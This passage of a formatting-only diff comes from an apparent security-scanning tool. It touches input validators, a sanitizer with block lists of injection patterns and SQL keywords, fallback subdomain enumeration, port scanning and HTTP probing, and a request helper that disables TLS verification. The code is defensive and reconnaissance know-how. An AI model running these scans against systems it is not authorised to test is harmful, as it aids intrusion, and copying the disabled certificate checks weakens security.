2)\n-    \n+    cpu_percent = resources.get(\"cpu_percent\", 50)\n+    memory_percent = resources.get(\"memory_percent\", 50)\n+    memory_available_gb = resources.get(\"memory_available_gb\", 2)\n+\n     # Conservative approach: reduce concurrency if resources are constrained\n     if cpu_percent > 80 or memory_percent > 80 or memory_available_gb < 1:\n         concurrency_factor = 0.5\n     elif cpu_percent > 60 or memory_percent > 60 or memory_available_gb < 2:\n         concurrency_factor = 0.75\n     else:\n         concurrency_factor = 1.0\n-    \n+\n     # Calculate optimized values\n     max_concurrent = max(1, int(8 * concurrency_factor))\n     parallel_jobs = max(1, int(10 * concurrency_factor))\n-    \n+\n     # Adjust timeout based on load\n     if cpu_percent > 70:\n         timeout_factor = 1.5  # Increase timeout when system is loaded\n     else:\n         timeout_factor = 1.0\n-    \n+\n     optimized_settings = {\n-        'max_concurrent_scans': max_concurrent,\n-        'parallel_jobs': parallel_jobs,\n-        'http_timeout': int(15 * timeout_factor)\n+        \"max_concurrent_scans\": max_concurrent,\n+        \"parallel_jobs\": parallel_jobs,\n+        \"http_timeout\": int(15 * timeout_factor),\n     }\n-    \n-    logger.log(f\"Optimized concurrency settings: {optimized_settings} (CPU: {cpu_percent}%, Memory: {memory_percent}%)\", \"DEBUG\")\n-    \n+\n+    logger.log(\n+        f\"Optimized concurrency settings: {optimized_settings} (CPU: {cpu_percent}%, Memory: {memory_percent}%)\",\n+        \"DEBUG\",\n+    )\n+\n     return optimized_settings\n+\n \n # Enhanced command execution with resource awareness\n @monitor_performance(\"command_execution\")\n def safe_run_command(cmd, timeout=300, **kwargs):\n     \"\"\"Safely run command with standardized error handling\"\"\"\n@@ -900,188 +1006,231 @@\n         cmd,\n         timeout=timeout,\n         default=None,\n         error_msg=f\"Command execution failed: {cmd}\",\n         log_level=\"ERROR\",\n-        **kwargs\n+        **kwargs,\n     )\n \n-def validate_input(value: str, validators: Dict[str, Any] = None, field_name: str = \"input\") -> bool:\n+\n+def validate_input(\n+    value: str, validators: Dict[str, Any] = None, field_name: str = \"input\"\n+) -> bool:\n     \"\"\"Enhanced input validation with detailed security considerations and error reporting\"\"\"\n     if validators is None:\n         validators = {}\n \n     # Check if empty input is allowed\n-    if not value and not validators.get('allow_empty', False):\n+    if not value and not validators.get(\"allow_empty\", False):\n         logger.log(f\"Empty {field_name} not allowed\", \"WARNING\")\n         return False\n \n     # Skip validation for empty values when allowed\n-    if not value and validators.get('allow_empty', False):\n+    if not value and validators.get(\"allow_empty\", False):\n         return True\n \n     # Length validation with specific guidance\n-    max_length = validators.get('max_length', 1000)\n+    max_length = validators.get(\"max_length\", 1000)\n     if len(value) > max_length:\n-        logger.log(f\"{field_name} exceeds maximum length: {len(value)} > {max_length} characters\", \"WARNING\")\n-        logger.log(f\"Consider shortening the {field_name} or using a file for longer inputs\", \"INFO\")\n+        logger.log(\n+            f\"{field_name} exceeds maximum length: {len(value)} > {max_length} characters\",\n+            \"WARNING\",\n+        )\n+        logger.log(\n+            f\"Consider shortening the {field_name} or using a file for longer inputs\",\n+            \"INFO\",\n+        )\n         return False\n \n     # Minimum length check\n-    min_length = validators.get('min_length', 0)\n+    min_length = validators.get(\"min_length\", 0)\n     if len(value) < min_length:\n-        logger.log(f\"{field_name} below minimum length: {len(value)} < {min_length} characters\", \"WARNING\")\n+        logger.log(\n+            f\"{field_name} below minimum length: {len(value)} < {min_length} characters\",\n+            \"WARNING\",\n+        )\n         return False\n \n     # Type validation\n-    expected_type = validators.get('type', str)\n+    expected_type = validators.get(\"type\", str)\n     if expected_type == str and not isinstance(value, str):\n-        logger.log(f\"{field_name} must be a string, got {type(value).__name__}\", \"WARNING\")\n+        logger.log(\n+            f\"{field_name} must be a string, got {type(value).__name__}\", \"WARNING\"\n+        )\n         return False\n \n     # Enhanced security checks with specific pattern explanations\n     security_patterns = {\n-        r'[;&|`$(){}[\\]\\\\]': 'Command injection characters',\n-        r'\\.\\.\\/': 'Path traversal patterns',\n-        r'<script[\\s>]': 'XSS script tags',\n-        r'javascript\\s*:': 'JavaScript protocol injection',\n-        r'<%.*%>': 'Server-side template injection',\n-        r'{{.*}}': 'Template engine injection',\n-        r'eval\\s*\\(': 'Code execution functions',\n-        r'exec\\s*\\(': 'Code execution functions',\n-        r'system\\s*\\(': 'System command execution',\n-        r'passthru\\s*\\(': 'Command execution functions',\n-        r'shell_exec\\s*\\(': 'Shell execution functions',\n-        r'\\$\\{.*\\}': 'Variable substitution injection',\n-        r'<!--.*#.*-->': 'Server-side include injection',\n-        r'<\\?php': 'PHP code injection',\n-        r'<%@': 'JSP code injection'\n+        r\"[;&|`$(){}[\\]\\\\]\": \"Command injection characters\",\n+        r\"\\.\\.\\/\": \"Path traversal patterns\",\n+        r\"<script[\\s>]\": \"XSS script tags\",\n+        r\"javascript\\s*:\": \"JavaScript protocol injection\",\n+        r\"<%.*%>\": \"Server-side template injection\",\n+        r\"{{.*}}\": \"Template engine injection\",\n+        r\"eval\\s*\\(\": \"Code execution functions\",\n+        r\"exec\\s*\\(\": \"Code execution functions\",\n+        r\"system\\s*\\(\": \"System command execution\",\n+        r\"passthru\\s*\\(\": \"Command execution functions\",\n+        r\"shell_exec\\s*\\(\": \"Shell execution functions\",\n+        r\"\\$\\{.*\\}\": \"Variable substitution injection\",\n+        r\"<!--.*#.*-->\": \"Server-side include injection\",\n+        r\"<\\?php\": \"PHP code injection\",\n+        r\"<%@\": \"JSP code injection\",\n     }\n \n     import re\n+\n     for pattern, description in security_patterns.items():\n         if re.search(pattern, value, re.IGNORECASE):\n-            logger.log(f\"Security violation in {field_name}: {description} detected\", \"WARNING\")\n+            logger.log(\n+                f\"Security violation in {field_name}: {description} detected\", \"WARNING\"\n+            )\n             logger.log(f\"Suspicious content: {value[:100]}...\", \"DEBUG\")\n             return False\n \n     # Domain/URL specific validation\n-    if validators.get('type') == 'domain':\n-        domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*$'\n+    if validators.get(\"type\") == \"domain\":\n+        domain_pattern = r\"^[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*$\"\n         if not re.match(domain_pattern, value):\n             logger.log(f\"Invalid domain format for {field_name}: {value}\", \"WARNING\")\n-            logger.log(\"Domain should be in format: example.com or sub.example.com\", \"INFO\")\n+            logger.log(\n+                \"Domain should be in format: example.com or sub.example.com\", \"INFO\"\n+            )\n             return False\n \n     # IP address validation\n-    if validators.get('type') == 'ip':\n+    if validators.get(\"type\") == \"ip\":\n         try:\n             import ipaddress\n+\n             ipaddress.ip_address(value)\n         except ValueError:\n-            logger.log(f\"Invalid IP address format for {field_name}: {value}\", \"WARNING\")\n+            logger.log(\n+                f\"Invalid IP address format for {field_name}: {value}\", \"WARNING\"\n+            )\n             logger.log(\"IP should be in format: 192.168.1.1 or 2001:db8::1\", \"INFO\")\n             return False\n \n     # URL validation\n-    if validators.get('type') == 'url':\n+    if validators.get(\"type\") == \"url\":\n         # More flexible URL pattern that handles both domains and IP addresses with ports\n-        url_pattern = r'^https?://([a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*|(\\d{1,3}\\.){3}\\d{1,3})(:\\d+)?(/.*)?$'\n+        url_pattern = r\"^https?://([a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*|(\\d{1,3}\\.){3}\\d{1,3})(:\\d+)?(/.*)?$\"\n         if not re.match(url_pattern, value):\n             logger.log(f\"Invalid URL format for {field_name}: {value}\", \"WARNING\")\n             logger.log(\"URL should start with http:// or https://\", \"INFO\")\n             return False\n \n     # Pattern validation with helpful error messages\n-    pattern = validators.get('pattern')\n+    pattern = validators.get(\"pattern\")\n     if pattern:\n         if not re.match(pattern, value):\n-            logger.log(f\"Invalid {field_name} format - does not match expected pattern\", \"WARNING\")\n-            pattern_description = validators.get('pattern_description', 'expected format')\n+            logger.log(\n+                f\"Invalid {field_name} format - does not match expected pattern\",\n+                \"WARNING\",\n+            )\n+            pattern_description = validators.get(\n+                \"pattern_description\", \"expected format\"\n+            )\n             logger.log(f\"Expected format: {pattern_description}\", \"INFO\")\n             return False\n \n     # Forbidden content check with specific reporting\n-    forbidden_content = validators.get('forbidden_content', [])\n+    forbidden_content = validators.get(\"forbidden_content\", [])\n     for forbidden in forbidden_content:\n         if forbidden.lower() in value.lower():\n-            logger.log(f\"Forbidden content detected in {field_name}: '{forbidden}'\", \"WARNING\")\n+            logger.log(\n+                f\"Forbidden content detected in {field_name}: '{forbidden}'\", \"WARNING\"\n+            )\n             logger.log(\"Remove or replace the forbidden content and try again\", \"INFO\")\n             return False\n \n     # File path validation\n-    if validators.get('type') == 'filepath':\n-        if not re.match(r'^[a-zA-Z0-9._/-]+$', value):\n+    if validators.get(\"type\") == \"filepath\":\n+        if not re.match(r\"^[a-zA-Z0-9._/-]+$\", value):\n             logger.log(f\"Invalid file path format for {field_name}: {value}\", \"WARNING\")\n-            logger.log(\"File path should contain only alphanumeric characters, dots, slashes, and hyphens\", \"INFO\")\n+            logger.log(\n+                \"File path should contain only alphanumeric characters, dots, slashes, and hyphens\",\n+                \"INFO\",\n+            )\n             return False\n \n     # Rate limit validation\n-    if validators.get('type') == 'rate_limit':\n+    if validators.get(\"type\") == \"rate_limit\":\n         try:\n             rate_val = int(value)\n             if rate_val < 1 or rate_val > 10000:\n-                logger.log(f\"Rate limit out of range for {field_name}: {rate_val} (should be 1-10000)\", \"WARNING\")\n+                logger.log(\n+                    f\"Rate limit out of range for {field_name}: {rate_val} (should be 1-10000)\",\n+                    \"WARNING\",\n+                )\n                 return False\n         except ValueError:\n-            logger.log(f\"Rate limit must be a number for {field_name}: {value}\", \"WARNING\")\n+            logger.log(\n+                f\"Rate limit must be a number for {field_name}: {value}\", \"WARNING\"\n+            )\n             return False\n \n     logger.log(f\"Input validation passed for {field_name}\", \"DEBUG\")\n     return True\n+\n \n def validate_domain_input(domain: str) -> bool:\n     \"\"\"Enhanced domain validation with detailed error reporting\"\"\"\n     if not domain:\n         logger.log(\"Domain cannot be empty\", \"WARNING\")\n         return False\n \n     # Remove protocol if present\n-    domain = domain.replace('http://', '').replace('https://', '').replace('www.', '')\n-    domain = domain.split('/')[0]  # Remove path\n-    domain = domain.split(':')[0]  # Remove port\n+    domain = domain.replace(\"http://\", \"\").replace(\"https://\", \"\").replace(\"www.\", \"\")\n+    domain = domain.split(\"/\")[0]  # Remove path\n+    domain = domain.split(\":\")[0]  # Remove port\n \n     # Check if this is actually an IP address (should fail domain validation)\n     try:\n         import ipaddress\n+\n         ipaddress.ip_address(domain)\n         # If we get here, it's a valid IP address, which should fail domain validation\n         return False\n     except ValueError:\n         # Not an IP address, continue with domain validation\n         pass\n \n-    if not validate_input(domain, {'type': 'domain', 'max_length': 253}, 'domain'):\n+    if not validate_input(domain, {\"type\": \"domain\", \"max_length\": 253}, \"domain\"):\n         return False\n \n     # Additional domain-specific checks\n     # Special case for localhost and similar single-word domains\n-    single_word_domains = ['localhost', 'internal', 'local']\n-    if domain.count('.') == 0 and domain.lower() not in single_word_domains:\n-        logger.log(f\"Domain appears to be incomplete: {domain} (missing TLD?)\", \"WARNING\")\n+    single_word_domains = [\"localhost\", \"internal\", \"local\"]\n+    if domain.count(\".\") == 0 and domain.lower() not in single_word_domains:\n+        logger.log(\n+            f\"Domain appears to be incomplete: {domain} (missing TLD?)\", \"WARNING\"\n+        )\n         logger.log(\"Example of valid domain: example.com\", \"INFO\")\n         return False\n \n     # Check for localhost or private domains\n-    private_domains = ['localhost', '127.0.0.1', '0.0.0.0', 'internal', 'local']\n+    private_domains = [\"localhost\", \"127.0.0.1\", \"0.0.0.0\", \"internal\", \"local\"]\n     if any(private in domain.lower() for private in private_domains):\n         logger.log(f\"Private/local domain detected: {domain}\", \"INFO\")\n         logger.log(\"Scanning local domains may have limited results\", \"INFO\")\n \n     return True\n+\n \n def validate_ip_input(ip: str) -> bool:\n     \"\"\"Enhanced IP address validation with detailed error reporting\"\"\"\n     if not ip:\n         logger.log(\"IP address cannot be empty\", \"WARNING\")\n         return False\n \n-    if not validate_input(ip, {'type': 'ip', 'max_length': 45}, 'IP address'):\n+    if not validate_input(ip, {\"type\": \"ip\", \"max_length\": 45}, \"IP address\"):\n         return False\n \n     try:\n         import ipaddress\n+\n         ip_obj = ipaddress.ip_address(ip)\n \n         # Check for private/reserved IP addresses\n         if ip_obj.is_private:\n             logger.log(f\"Private IP address detected: {ip}\", \"INFO\")\n@@ -1100,30 +1249,32 @@\n         return True\n     except ValueError as e:\n         logger.log(f\"Invalid IP address format: {ip} - {e}\", \"WARNING\")\n         return False\n \n+\n def validate_url_input(url: str) -> bool:\n     \"\"\"Enhanced URL validation with detailed error reporting\"\"\"\n     if not url:\n         logger.log(\"URL cannot be empty\", \"WARNING\")\n         return False\n \n-    if not validate_input(url, {'type': 'url', 'max_length': 2048}, 'URL'):\n+    if not validate_input(url, {\"type\": \"url\", \"max_length\": 2048}, \"URL\"):\n         return False\n \n     # Additional URL-specific checks\n     from urllib.parse import urlparse\n+\n     try:\n         parsed = urlparse(url)\n \n         if not parsed.scheme:\n             logger.log(f\"URL missing protocol: {url}\", \"WARNING\")\n             logger.log(\"URL should start with http:// or https://\", \"INFO\")\n             return False\n \n-        if parsed.scheme not in ['http', 'https']:\n+        if parsed.scheme not in [\"http\", \"https\"]:\n             logger.log(f\"Unsupported URL protocol: {parsed.scheme}\", \"WARNING\")\n             logger.log(\"Only HTTP and HTTPS protocols are supported\", \"INFO\")\n             return False\n \n         if not parsed.netloc:\n@@ -1135,10 +1286,11 @@\n         hostname = parsed.hostname\n         if hostname:\n             # Check if it's an IP address\n             try:\n                 import ipaddress\n+\n                 ipaddress.ip_address(hostname)\n                 # For URLs, we accept all valid IP addresses including private ones\n                 return True\n             except ValueError:\n                 # It's a domain name\n@@ -1150,83 +1302,95 @@\n         return False\n \n \n # ---------- Enhanced Input Sanitization System ----------\n \n+\n class EnhancedInputSanitizer:\n     \"\"\"Advanced input sanitization with security-first approach\"\"\"\n-    \n+\n     # Comprehensive pattern definitions\n     PATTERNS = {\n-        'domain': r'^[a-zA-Z0-9]([a-zA-Z0-9\\-\\.]{0,253}[a-zA-Z0-9])?$',\n-        'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$',\n-        'url': r'^https?://[^\\s/$.?#].[^\\s]*$',\n-        'ipv4': r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$',\n-        'port': r'^([1-9]|[1-5]?[0-9]{2,4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$',\n-        'filename': r'^[a-zA-Z0-9._-]+$',\n-        'safe_string': r'^[a-zA-Z0-9\\s._-]+$'\n+        \"domain\": r\"^[a-zA-Z0-9]([a-zA-Z0-9\\-\\.]{0,253}[a-zA-Z0-9])?$\",\n+        \"email\": r\"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$\",\n+        \"url\": r\"^https?://[^\\s/$.?#].[^\\s]*$\",\n+        \"ipv4\": r\"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$\",\n+        \"port\": r\"^([1-9]|[1-5]?[0-9]{2,4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$\",\n+        \"filename\": r\"^[a-zA-Z0-9._-]+$\",\n+        \"safe_string\": r\"^[a-zA-Z0-9\\s._-]+$\",\n     }\n-    \n+\n     # Dangerous patterns to block\n     DANGEROUS_PATTERNS = [\n-        r'[;&|`$()<>{}\\\\]',  # Command injection chars\n-        r'\\.\\./',            # Directory traversal\n-        r'<script[^>]*>',    # XSS script tags\n-        r'javascript:',      # JavaScript protocol\n-        r'\\x00',            # Null bytes\n+        r\"[;&|`$()<>{}\\\\]\",  # Command injection chars\n+        r\"\\.\\./\",  # Directory traversal\n+        r\"<script[^>]*>\",  # XSS script tags\n+        r\"javascript:\",  # JavaScript protocol\n+        r\"\\x00\",  # Null bytes\n     ]\n-    \n+\n     def __init__(self):\n         self.blocked_keywords = [\n-            'DROP TABLE', 'DELETE FROM', 'INSERT INTO', 'UNION SELECT',\n-            '--', '/*', '*/', '<script>', 'javascript:', 'eval(',\n-            'exec(', 'system(', 'shell_exec('\n+            \"DROP TABLE\",\n+            \"DELETE FROM\",\n+            \"INSERT INTO\",\n+            \"UNION SELECT\",\n+            \"--\",\n+            \"/*\",\n+            \"*/\",\n+            \"<script>\",\n+            \"javascript:\",\n+            \"eval(\",\n+            \"exec(\",\n+            \"system(\",\n+            \"shell_exec(\",\n         ]\n-    \n-    def sanitize_input(self, data: str, input_type: str = 'safe_string', \n-                      max_length: int = 1000) -> Tuple[bool, str, List[str]]:\n+\n+    def sanitize_input(\n+        self, data: str, input_type: str = \"safe_string\", max_length: int = 1000\n+    ) -> Tuple[bool, str, List[str]]:\n         \"\"\"Comprehensive input sanitization\"\"\"\n         warnings = []\n-        \n+\n         if not data:\n             return False, \"\", [\"Empty input not allowed\"]\n-        \n+\n         # Length check\n         if len(data) > max_length:\n             warnings.append(f\"Input truncated from {len(data)} to {max_length}\")\n             data = data[:max_length]\n-        \n+\n         # Remove control characters\n         original_len = len(data)\n-        data = re.sub(r'[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F-\\x9F]', '', data)\n+        data = re.sub(r\"[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F-\\x9F]\", \"\", data)\n         if len(data) != original_len:\n             warnings.append(\"Removed control characters\")\n-        \n+\n         # Check for dangerous patterns\n         for pattern in self.DANGEROUS_PATTERNS:\n             if re.search(pattern, data, re.IGNORECASE):\n                 return False, \"\", [f\"Dangerous pattern detected\"]\n-        \n+\n         # Check for blocked keywords\n         data_upper = data.upper()\n         for keyword in self.blocked_keywords:\n             if keyword in data_upper:\n                 return False, \"\", [f\"Blocked keyword detected\"]\n-        \n+\n         # Type-specific validation\n         if input_type in self.PATTERNS:\n             if not re.match(self.PATTERNS[input_type], data):\n                 return False, \"\", [f\"Invalid format for type: {input_type}\"]\n-        \n+\n         return True, data.strip(), warnings\n \n \n # Initialize global sanitizer\n GLOBAL_SANITIZER = EnhancedInputSanitizer()\n \n \n-def sanitize_user_input(data: str, input_type: str = 'safe_string') -> Tuple[bool, str]:\n+def sanitize_user_input(data: str, input_type: str = \"safe_string\") -> Tuple[bool, str]:\n     \"\"\"Convenient wrapper for global sanitizer\"\"\"\n     is_valid, sanitized, warnings = GLOBAL_SANITIZER.sanitize_input(data, input_type)\n     if warnings:\n         for warning in warnings:\n             logger.log(f\"Input sanitization warning: {warning}\", \"WARNING\")\n@@ -1241,22 +1405,38 @@\n         logger.log(\"Using fallback subdomain enumeration method\", \"INFO\")\n \n         # Extract domain from args\n         domain = None\n         for i, arg in enumerate(args):\n-            if i > 0 and not arg.startswith('-'):  # Likely the domain\n+            if i > 0 and not arg.startswith(\"-\"):  # Likely the domain\n                 domain = arg\n                 break\n \n         if not domain:\n-            logger.log(\"Cannot determine domain for fallback subdomain enumeration\", \"ERROR\")\n+            logger.log(\n+                \"Cannot determine domain for fallback subdomain enumeration\", \"ERROR\"\n+            )\n             return False\n \n         # Simple DNS-based subdomain discovery\n         common_subdomains = [\n-            'www', 'mail', 'ftp', 'admin', 'api', 'test', 'dev', 'staging',\n-            'blog', 'shop', 'portal', 'secure', 'vpn', 'cdn', 'm', 'mobile'\n+            \"www\",\n+            \"mail\",\n+            \"ftp\",\n+            \"admin\",\n+            \"api\",\n+            \"test\",\n+            \"dev\",\n+            \"staging\",\n+            \"blog\",\n+            \"shop\",\n+            \"portal\",\n+            \"secure\",\n+            \"vpn\",\n+            \"cdn\",\n+            \"m\",\n+            \"mobile\",\n         ]\n \n         found_subdomains = []\n \n         try:\n@@ -1274,11 +1454,14 @@\n \n             # Write results\n             if output_file:\n                 result_content = \"\\n\".join(found_subdomains) + \"\\n\"\n                 atomic_write(output_file, result_content)\n-                logger.log(f\"Fallback subdomain enumeration found {len(found_subdomains)} subdomains\", \"INFO\")\n+                logger.log(\n+                    f\"Fallback subdomain enumeration found {len(found_subdomains)} subdomains\",\n+                    \"INFO\",\n+                )\n                 return True\n \n         except Exception as e:\n             logger.log(f\"Fallback subdomain enumeration failed: {e}\", \"ERROR\")\n             return False\n@@ -1290,11 +1473,11 @@\n         logger.log(\"Using fallback port scanning method\", \"INFO\")\n \n         # Extract target from args\n         target = None\n         for i, arg in enumerate(args):\n-            if i > 0 and not arg.startswith('-'):  # Likely the target\n+            if i > 0 and not arg.startswith(\"-\"):  # Likely the target\n                 target = arg\n                 break\n \n         if not target:\n             logger.log(\"Cannot determine target for fallback port scan\", \"ERROR\")\n@@ -1321,11 +1504,13 @@\n \n             # Write results\n             if output_file:\n                 result_content = \"\\n\".join(open_ports) + \"\\n\"\n                 atomic_write(output_file, result_content)\n-                logger.log(f\"Fallback port scan found {len(open_ports)} open ports\", \"INFO\")\n+                logger.log(\n+                    f\"Fallback port scan found {len(open_ports)} open ports\", \"INFO\"\n+                )\n                 return True\n \n         except Exception as e:\n             logger.log(f\"Fallback port scan failed: {e}\", \"ERROR\")\n             return False\n@@ -1337,13 +1522,13 @@\n         logger.log(\"Using fallback HTTP probing method\", \"INFO\")\n \n         # Extract URLs from args or construct from targets\n         urls = []\n         for arg in args:\n-            if arg.startswith('http'):\n+            if arg.startswith(\"http\"):\n                 urls.append(arg)\n-            elif '.' in arg and not arg.startswith('-'):\n+            elif \".\" in arg and not arg.startswith(\"-\"):\n                 urls.extend([f\"http://{arg}\", f\"https://{arg}\"])\n \n         if not urls:\n             logger.log(\"No URLs found for fallback HTTP probe\", \"ERROR\")\n             return False\n@@ -1356,42 +1541,49 @@\n             for url in urls:\n                 try:\n                     response = requests.get(url, timeout=5, verify=False)\n                     if response.status_code < 400:\n                         live_urls.append(f\"{url} [{response.status_code}]\")\n-                        logger.log(f\"HTTP probe: {url} - {response.status_code}\", \"DEBUG\")\n+                        logger.log(\n+                            f\"HTTP probe: {url} - {response.status_code}\", \"DEBUG\"\n+                        )\n                 except Exception:\n                     continue\n \n             # Write results\n             if output_file:\n                 result_content = \"\\n\".join(live_urls) + \"\\n\"\n                 atomic_write(output_file, result_content)\n-                logger.log(f\"Fallback HTTP probe found {len(live_urls)} live URLs\", \"INFO\")\n+                logger.log(\n+                    f\"Fallback HTTP probe found {len(live_urls)} live URLs\", \"INFO\"\n+                )\n                 return True\n \n         except Exception as e:\n             logger.log(f\"Fallback HTTP probe failed: {e}\", \"ERROR\")\n             return False\n \n         return len(live_urls) > 0\n \n     # Return mapping of tool names to fallback functions\n     return {\n-        'subfinder': fallback_subdomain_enum,\n-        'amass': fallback_subdomain_enum,\n-        'nmap': fallback_port_scan,\n-        'naabu': fallback_port_scan,\n-        'masscan': fallback_port_scan,\n-        'httpx': fallback_http_probe\n+        \"subfinder\": fallback_subdomain_enum,\n+        \"amass\": fallback_subdomain_enum,\n+        \"nmap\": fallback_port_scan,\n+        \"naabu\": fallback_port_scan,\n+        \"masscan\": fallback_port_scan,\n+        \"httpx\": fallback_http_probe,\n     }\n+\n \n # Initialize fallback functions\n FALLBACK_FUNCTIONS = create_fallback_functions()\n \n-def safe_http_request(url: str, method: str = 'GET', timeout: int = 10,\n-                     retries: int = 3, **kwargs) -> Optional[Dict[str, Any]]:\n+\n+def safe_http_request(\n+    url: str, method: str = \"GET\", timeout: int = 10, retries: int = 3, **kwargs\n+) -> Optional[Dict[str, Any]]:\n     \"\"\"Safe HTTP request with enhanced error handling and retry logic\"\"\"\n     try:\n         import requests\n         from requests.adapters import HTTPAdapter\n         from requests.packages.urllib3.util.retry import Retry\n@@ -1399,157 +1591,175 @@\n         # Configure retry strategy\n         retry_strategy = Retry(\n             total=retries,\n             backoff_factor=1,\n             status_forcelist=[429, 500, 502, 503, 504],\n-            allowed_methods=[\"HEAD\", \"GET\", \"OPTIONS\", \"POST\"]\n+            allowed_methods=[\"HEAD\", \"GET\", \"OPTIONS\", \"POST\"],\n         )\n \n         # Create session with retry adapter\n         session = requests.Session()\n         adapter = HTTPAdapter(max_retries=retry_strategy)\n         session.mount(\"http://\", adapter)\n         session.mount(\"https://\", adapter)\n \n         # Set default headers\n         default_headers = {\n-            'User-Agent': 'Bl4ckC3ll_PANTHEON/9.0.0 Security Scanner',\n-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n-            'Accept-Language': 'en-US,en;q=0.5',\n-            'Accept-Encoding': 'gzip, deflate',\n-            'Connection': 'keep-alive'\n+            \"User-Agent\": \"Bl4ckC3ll_PANTHEON/9.0.0 Security Scanner\",\n+            \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n+            \"Accept-Language\": \"en-US,en;q=0.5\",\n+            \"Accept-Encoding\": \"gzip, deflate\",\n+            \"Connection\": \"keep-alive\",\n         }\n \n-        headers = kwargs.get('headers', {})\n+        headers = kwargs.get(\"headers\", {})\n         headers.update(default_headers)\n-        kwargs['headers'] = headers\n-        kwargs['timeout'] = timeout\n-        kwargs['verify'] = kwargs.get('verify', False)  # Disable SSL verification for security testing\n+        kwargs[\"headers\"] = headers\n+        kwargs[\"timeout\"] = timeout\n+        kwargs[\"verify\"] = kwargs.get(\n+            \"verify\", False\n+        )  # Disable SSL verification for security testing\n \n         logger.log(f\"Making {method} request to {url}\", \"DEBUG\")\n \n         # Make the request\n         response = session.request(method, url, **kwargs)\n \n         result = {\n-            'status_code': response.status_code,\n-            'headers': dict(response.headers),\n-            'content': response.text,\n-            'url': response.url,\n-            'elapsed': response.elapsed.total_seconds(),\n-            'success': True\n+            \"status_code\": response.status_code,\n+            \"headers\": dict(response.headers),\n+            \"content\": response.text,\n+            \"url\": response.url,\n+            \"elapsed\": response.elapsed.total_seconds(),\n+            \"success\": True,\n         }\n \n-        logger.log(f\"HTTP request successful: {url} - {response.status_code} ({response.elapsed.total_seconds():.2f}s)\", \"DEBUG\")\n+        logger.log(\n+            f\"HTTP request successful: {url} - {response.status_code} ({response.elapsed.total_seconds():.2f}s)\",\n+            \"DEBUG\",\n+        )\n         return result\n \n     except requests.exceptions.ConnectionError as e:\n         logger.log(f\"Connection error for {url}: {e}\", \"WARNING\")\n         logger.log(\"Check network connectivity and target availability\", \"INFO\")\n-        return {'success': False, 'error': 'connection_error', 'message': str(e)}\n+        return {\"success\": False, \"error\": \"connection_error\", \"message\": str(e)}\n \n     except requests.exceptions.Timeout as e:\n         logger.log(f\"Request timeout for {url}: {e}\", \"WARNING\")\n-        logger.log(f\"Consider increasing timeout (current: {timeout}s) or check network speed\", \"INFO\")\n-        return {'success': False, 'error': 'timeout', 'message': str(e)}\n+        logger.log(\n+            f\"Consider increasing timeout (current: {timeout}s) or check network speed\",\n+            \"INFO\",\n+        )\n+        return {\"success\": False, \"error\": \"timeout\", \"message\": str(e)}\n \n     except requests.exceptions.SSLError as e:\n         logger.log(f\"SSL error for {url}: {e}\", \"WARNING\")\n-        logger.log(\"SSL verification disabled for security testing, but target may have SSL issues\", \"INFO\")\n-        return {'success': False, 'error': 'ssl_error', 'message': str(e)}\n+        logger.log(\n+            \"SSL verification disabled for security testing, but target may have SSL issues\",\n+            \"INFO\",\n+        )\n+        return {\"success\": False, \"error\": \"ssl_error\", \"message\": str(e)}\n \n     except requests.exceptions.TooManyRedirects as e:\n         logger.log(f\"Too many redirects for {url}: {e}\", \"WARNING\")\n         logger.log(\"Target may have redirect loops or excessive redirects\", \"INFO\")\n-        return {'success': False, 'error': 'redirect_error', 'message': str(e)}\n+        return {\"success\": False, \"error\": \"redirect_error\", \"message\": str(e)}\n \n     except requests.exceptions.RequestException as e:\n         logger.log(f\"Request error for {url}: {e}\", \"WARNING\")\n-        logger.log(\"General request error - check URL format and target availability\", \"INFO\")\n-        return {'success': False, 'error': 'request_error', 'message': str(e)}\n+        logger.log(\n+            \"General request error - check URL format and target availability\", \"INFO\"\n+        )\n+        return {\"success\": False, \"error\": \"request_error\", \"message\": str(e)}\n \n     except Exception as e:\n         logger.log(f\"Unexpected error making request to {url}: {e}\", \"ERROR\")\n-        return {'success': False, 'error': 'unexpected_error', 'message': str(e)}\n+        return {\"success\": False, \"error\": \"unexpected_error\", \"message\": str(e)}\n \n \n # ---------- Performance Monitoring System ----------\n+\n \n class PerformanceMonitor:\n     \"\"\"Advanced performance monitoring and optimization system\"\"\"\n-    \n+\n     def __init__(self, max_history: int = 100):\n         self.max_history = max_history\n         self.metrics_history = []\n         self.start_time = time.time()\n         self.monitoring = False\n         self.monitor_thread = None\n-        \n+\n     def start_monitoring(self):\n         \"\"\"Start performance monitoring in background\"\"\"\n         if not self.monitoring and HAS_PSUTIL:\n             self.monitoring = True\n-            self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)\n+            self.monitor_thread = threading.Thread(\n+                target=self._monitor_loop, daemon=True\n+            )\n             self.monitor_thread.start()\n             logger.log(\"Performance monitoring started\", \"INFO\")\n-    \n+\n     def 